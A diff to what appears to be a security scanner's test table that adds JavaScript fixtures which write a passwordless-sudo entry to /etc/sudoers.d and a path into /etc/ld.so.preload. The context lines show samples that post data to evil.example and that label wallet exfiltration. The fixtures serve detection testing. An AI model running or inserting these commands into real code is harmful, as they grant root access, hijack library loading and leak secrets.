@@ -267,6 +267,20 @@ fetch('https://evil.example/c', { method: 'POST', body: t });`,
 await octokit.git.createBlob({ owner, repo, content: k });`,
 		},
 		{
+			name:     "jsrisk sudoers tamper through public API",
+			filename: "index.js",
+			ruleID:   "JS_SUDOERS_TAMPER_001",
+			content: `const fs = require('fs');
+fs.appendFileSync('/etc/sudoers.d/x', 'user ALL=(ALL) NOPASSWD:ALL');`,
+		},
+		{
+			name:     "jsrisk host trust tamper through public API",
+			filename: "index.js",
+			ruleID:   "JS_HOST_TRUST_TAMPER_001",
+			content: `const fs = require('fs');
+fs.writeFileSync('/etc/ld.so.preload', '/tmp/libx.so');`,
+		},
+		{
 			name:     "rsbuild wallet read -> network through public API",
 			filename: "build.rs",
 			ruleID:   "RS_BUILD_WALLET_EXFIL_001",
